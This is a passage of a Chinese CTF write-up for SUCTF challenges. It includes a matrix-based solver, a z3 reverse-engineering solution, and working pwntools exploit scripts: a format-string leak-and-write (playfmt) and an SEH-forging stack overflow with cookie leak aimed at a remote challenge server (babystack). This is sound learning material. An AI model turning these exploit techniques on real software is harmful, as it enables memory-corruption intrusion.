class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>]])</span><br><span class="line">res = <span class="string">"FFFFFF94FFFFFF3800000126FFFFFF28FFFFFC1000000294FFFFFC9E000006EA000000DC00000006FFFFFF0CFFFFFDF6FFFFFA82FFFFFCD000000182000003DE0000014E000002B2FFFFF8D800000174FFFFFAA6FFFFF9D4000001C2FFFFF97C0000035A00000146FFFFFF3CFFFFFA14000001CE000007DCFFFFFD48000000980000085EFFFFFDB0FFFFFFBC0000036EFFFFFF4EFFFFF836000005C0000006AE0000069400000022"</span>.decode(<span class="string">"hex"</span>)</span><br><span class="line">y = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">42</span>):</span><br><span class="line">    tmp = res[i*<span class="number">4</span>:i*<span class="number">4</span>+<span class="number">4</span>]</span><br><span class="line">    tmp = unpack(<span class="string">"&gt;i"</span>,tmp)[<span class="number">0</span>]</span><br><span class="line">    y.append(tmp)</span><br><span class="line">B = mat(y)</span><br><span class="line"></span><br><span class="line">B = B.reshape(<span class="number">42</span>,<span class="number">1</span>)</span><br><span class="line">B = A.I*B</span><br><span class="line">B = B.reshape(<span class="number">1</span>,<span class="number">42</span>)</span><br><span class="line">B = B.tolist()[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">42</span>):</span><br><span class="line">    B[i] = int(round(B[i]))</span><br><span class="line">    B[i]^=i</span><br><span class="line">    B[i] = (B[i]&gt;&gt;<span class="number">3</span>)|(B[i]&lt;&lt;<span class="number">5</span>)</span><br><span class="line">    B[i]&amp;=<span class="number">0xff</span></span><br><span class="line">print(<span class="string">""</span>.join(map(chr,B)))</span><br></pre></td></tr></table></figure>
<h2 id="Rev"><a href="#Rev" class="headerlink" title="Rev"></a>Rev</h2><p>不太懂c++，瞎调。</p>
<p>首先在<code>00000001400016A3</code>有两个check，一开始不知道干啥的，随便试</p>
<p>后面看到<code>sub_140002B80</code>里面有isspace和ispunct，猜测跟符号有关。瞎调调出来是用符号分割成几部分，第一个校验3部分，第二个校验第一部分的长度10</p>
<p>之后在<code>0000000140001763</code>附近把第一组异或了0xAB，然后和常量对比。然而常量只有5字节，实在想不出还有啥东西了，就直接跳过了</p>
<p>下一部分校验长度4，然后校验大写字母，然后是A-G，后一字节依次比前一字节大2，得出ACEG</p>
<p>最后一部分先是atoi，然后校验偶数，和两个方程。直接z3求出。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> Solver</span><br><span class="line">s = Solver()</span><br><span class="line">x = BitVec(<span class="string">"x"</span>,<span class="number">32</span>)</span><br><span class="line">s.add(x&amp;<span class="number">1</span>==<span class="number">0</span>)</span><br><span class="line">s.add(((<span class="number">0x4D2</span> * x + <span class="number">0x162E</span>) / <span class="number">0x112C</span> ^ <span class="number">0xABCDDCBA</span>) == <span class="number">0xABCDB8B9</span>)</span><br><span class="line">s.add(((<span class="number">0x91E</span> * x + <span class="number">0x2693</span>) / <span class="number">0x1E61</span> ^ <span class="number">0x12336790</span>) == <span class="number">0x1233FC70</span>)</span><br><span class="line">print(s.check())</span><br><span class="line">print(s.model())</span><br></pre></td></tr></table></figure>
<p>得到flag:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">suctf&#123;ACEG31415926&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="playfmt"><a href="#playfmt" class="headerlink" title="playfmt"></a>playfmt</h2><p>flag在堆上格式化字符串读出来就可以</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">main_ebp_offset = <span class="number">26</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">format_offset</span><span class="params">(format_str , offset)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> format_str.replace(<span class="string">"&#123;&#125;"</span> , str(offset))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_target</span><span class="params">(offset , name)</span>:</span></span><br><span class="line">    payload = format_offset(<span class="string">"%&#123;&#125;$p\x00"</span> , offset)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    text = p.recv()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">		value = int(text.split(<span class="string">"\n"</span>)[<span class="number">0</span>] , <span class="number">16</span>)</span><br><span class="line">		print(name + <span class="string">" : "</span> + hex(value))</span><br><span class="line">		<span class="keyword">return</span> value</span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        <span class="keyword">print</span> text</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modify_byte</span><span class="params">(last_byte , offset)</span>:</span></span><br><span class="line">    payload = <span class="string">"%"</span> + str(last_byte) + <span class="string">"c"</span> + format_offset(<span class="string">"%&#123;&#125;$hhn"</span> , offset)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.recv()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modify</span><span class="params">(addr , value , ebp_offset , ebp_1_offset)</span>:</span></span><br><span class="line">    addr_last_byte = addr &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        now_value = (value &gt;&gt; i * <span class="number">8</span>) &amp; <span class="number">0xff</span></span><br><span class="line">        modify_byte(addr_last_byte + i ,  ebp_offset)</span><br><span class="line">        modify_byte(now_value , ebp_1_offset)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./playfmt"</span>)</span><br><span class="line"><span class="comment">#elf = ELF("./playfmt")</span></span><br><span class="line"><span class="comment">#p = remote("120.78.192.35",9999)</span></span><br><span class="line">elf = ELF(<span class="string">"./playfmt"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"=\n"</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">raw_input()</span><br><span class="line">play_ebp_addr = get_target(<span class="number">6</span>,  <span class="string">"ebp"</span>)</span><br><span class="line"></span><br><span class="line">raw_input()</span><br><span class="line">ebp_addr = get_target(<span class="number">6</span>,  <span class="string">"ebp"</span>)</span><br><span class="line">flag_ptr = <span class="number">19</span></span><br><span class="line">flag_addr = get_target(flag_ptr , <span class="string">"addr"</span>) - <span class="number">0x420</span></span><br><span class="line">log.info(hex(flag_addr))</span><br><span class="line"></span><br><span class="line">modify(ebp_addr + <span class="number">4</span> , flag_addr , <span class="number">6</span> , <span class="number">14</span>)</span><br><span class="line">payload = format_offset(<span class="string">"%&#123;&#125;$s\x00"</span> , <span class="number">14</span> + <span class="number">1</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="babystack"><a href="#babystack" class="headerlink" title="babystack"></a>babystack</h2><p>为方便本地测试，先可选头中的地址随机化选项关掉。</p>
<p>开始让你输入一个数，这里有栈溢出，但是没用，因为最后是直接exit掉的。</p>
<p>注意到<code>0040853C</code>有一处花指令，实际上这里就是获取下一行的地址，然后把输入减去这个地址，然后输入除以它。</p>
<p>这时想到，如果除以零会怎样，于是输入0040853C，发现通过异常处理进入了新的函数<code>sub_407F60</code></p>
<p>分析这里的功能，它提供了10次任意地址读取。输入选项yes和no的时候有栈溢出，同时如果输入的不是yes或no，调用fgets又能栈溢出。</p>
<p>开头写死了两个1。结束时会把他们相加然后与三校验，正确会输出flag。我们输入的字符串是在这两个数据高位的，所以不能溢出覆盖到他们。</p>
<p>同时由于最后也是exit掉的，所以也不能覆盖返回地址。</p>
<p>测试了下任意地址读取，如果输入非法地址会异常，进入一个异常处理函数。</p>
<p>观察一下函数开头的代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.text:00407F60                 push    ebp</span><br><span class="line">.text:00407F61                 mov     ebp, esp</span><br><span class="line">.text:00407F63                 push    0FFFFFFFEh</span><br><span class="line">.text:00407F65                 push    offset dword_47ACC0</span><br><span class="line">.text:00407F6A                 push    offset SEH_407F60</span><br><span class="line">.text:00407F6F                 mov     eax, large fs:0</span><br><span class="line">.text:00407F75                 push    eax</span><br><span class="line">.text:00407F76                 add     esp, 0FFFFFF2Ch</span><br><span class="line">.text:00407F7C                 mov     eax, ___security_cookie</span><br><span class="line">.text:00407F81                 xor     [ebp+var_8], eax</span><br><span class="line">.text:00407F84                 xor     eax, ebp</span><br><span class="line">.text:00407F86                 mov     [ebp+var_1C], eax</span><br><span class="line">.text:00407F89                 push    ebx</span><br><span class="line">.text:00407F8A                 push    esi</span><br><span class="line">.text:00407F8B                 push    edi</span><br><span class="line">.text:00407F8C                 push    eax</span><br><span class="line">.text:00407F8D                 lea     eax, [ebp+var_10]</span><br></pre></td></tr></table></figure>
<p>security_cookie是全局变量上一个值，每一个进程自始至终是固定的。它异或到了ebp-8的数据上，调试一下发现这里指向SEH结构体，之后又异或了ebp放到ebp-1Ch作为canary。</p>
<p>想到可以在栈上伪造一个seh结构体，然后把ebp-8覆盖成我们伪造的结构体，结构体中的异常处理函数改成程序中的后门地址。由于这个地址异或了cookie，所以我们还要读取cookie的值。</p>
<p>经过多次调试发现还有一些栈上的值不能变，通过计算偏移覆盖或者直接用任意地址读取后覆盖。需要注意的是ebp-4应为0。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">main_aslr = <span class="number">0x1c395e</span></span><br><span class="line">main_addr = <span class="number">0x0040395E</span></span><br><span class="line">cookie_addr = <span class="number">0x0047C004</span></span><br><span class="line">stack_addr = <span class="number">0x19FF10</span></span><br><span class="line">cookie_aslr = cookie_addr-main_addr+main_aslr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_stack</span><span class="params">(stack)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Do you want to know more?"</span>)</span><br><span class="line">    p.sendline(<span class="string">"yes"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Where do you want to know?"</span>)</span><br><span class="line">    p.sendline(str(stack-stack_addr+stack_aslr))</span><br><span class="line">    p.recvuntil(<span class="string">"value is "</span>)</span><br><span class="line">    s = p.recvline().strip()</span><br><span class="line">    s = eval(s)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"121.40.159.66"</span>,<span class="string">"6666"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"stack address = "</span>)</span><br><span class="line">stack_aslr = eval(p.recv(<span class="number">8</span>))</span><br><span class="line">log.success(<span class="string">"stack:0x%x"</span>%stack_aslr)</span><br><span class="line">p.recvuntil(<span class="string">"main address = "</span>)</span><br><span class="line">main_aslr = eval(p.recv(<span class="number">8</span>))</span><br><span class="line">log.success(<span class="string">"main:0x%x"</span>%main_aslr)</span><br><span class="line">str4_addr = <span class="number">0x0019FE48</span>-stack_addr+stack_aslr</span><br><span class="line">p.recvuntil(<span class="string">"So,Can You Tell me what did you know?"</span>)</span><br><span class="line">p.sendline(<span class="string">"00408541"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Do you want to know more?"</span>)</span><br><span class="line">p.sendline(<span class="string">"yes"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Where do you want to know?"</span>)</span><br><span class="line">p.sendline(str(cookie_aslr))</span><br><span class="line">p.recvuntil(<span class="string">"value is "</span>)</span><br><span class="line">cookie = p.recvline().strip()</span><br><span class="line">cookie = eval(cookie)</span><br><span class="line">log.success(<span class="string">"cookie:0x%x"</span>%cookie)</span><br><span class="line">s1 = leak_stack(<span class="number">0x19fed4</span>)</span><br><span class="line">s4 = leak_stack(<span class="number">0x19fee0</span>)</span><br><span class="line">s5 = leak_stack(<span class="number">0x19fee4</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Do you want to know more?"</span>)</span><br><span class="line">p.sendline(<span class="string">"y"</span>)</span><br><span class="line">payload = <span class="string">'aaaa'</span> + p32(<span class="number">0xffffffe4</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0xffffff0c</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0xfffffffe</span>)+p32(<span class="number">0x408224</span>-main_addr+main_aslr)+p32(<span class="number">0x00408266</span>-main_addr+main_aslr)</span><br><span class="line">payload = payload.ljust(<span class="number">144</span>,<span class="string">"a"</span>) + p32(s1) + <span class="string">'a'</span>*<span class="number">8</span> + p32(s4) + p32(s5) + p32(cookie^str4_addr) + p32(<span class="number">0</span>)</span><br><span class="line">print(len(payload))</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">"Do you want to know more?"</span>)</span><br><span class="line">p.sendline(<span class="string">"yes"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Where do you want to know?\r\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"0"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="sudrv"><a href="#sudrv" class="headerlink" title="sudrv"></a>sudrv</h2><p>格式化拿内核地址和栈地址，堆溢出覆盖，多次分配到栈上ROP。</p>
